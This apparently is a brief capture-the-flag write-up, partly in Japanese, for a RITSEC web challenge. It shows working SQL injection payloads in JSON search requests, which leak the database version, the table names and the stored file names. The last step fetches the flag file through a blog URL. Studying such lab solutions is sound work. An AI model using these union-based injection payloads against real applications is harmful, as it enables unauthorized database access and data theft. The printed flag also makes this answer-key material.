request
```
POST /search HTTP/1.1
Host: toontown-fan-club.ctf.ritsec.club
...

{"searchTerm":"' or 1=1 union select 'a', version(), 'c' #"}
```
response
```
HTTP/1.1 200 OK
server: Werkzeug/3.0.2 Python/3.12.2
date: Sat, 06 Apr 2024 11:49:57 GMT
content-type: application/json
content-length: 228
connection: close

[{"name":"CEO","slug":"chief-executive-officer"},{"name":"CFO","slug":"chief-financial-officer"},{"name":"CJ","slug":"chief-justice"},{"name":"VP","slug":"senior-vice-president"},{"name":"10.5.23-MariaDB-0+deb11u1","slug":"a"}]
```

request
```
{"searchTerm":"'union select group_concat(table_name), null, null from information_schema.columns #"}
```
response
```
...
post
post
post
testXCHG
users
OK
sqlmapfile
sqlmapoutput
```

request
```
{"searchTerm":"'union select slug, filename, null from post #"}
```
response（なんかほかの人たちがいっぱい作ってるっぽい）
```
...
{"name":"flag.txt","slug":"apple"},
...
```

```
$ curl https://toontown-fan-club.ctf.ritsec.club/blog/apple
...
        RS{1NJ3CT_AND_1NCLUD3}
...

本来は、`post`テーブルに`name, slug, filename`を追加する
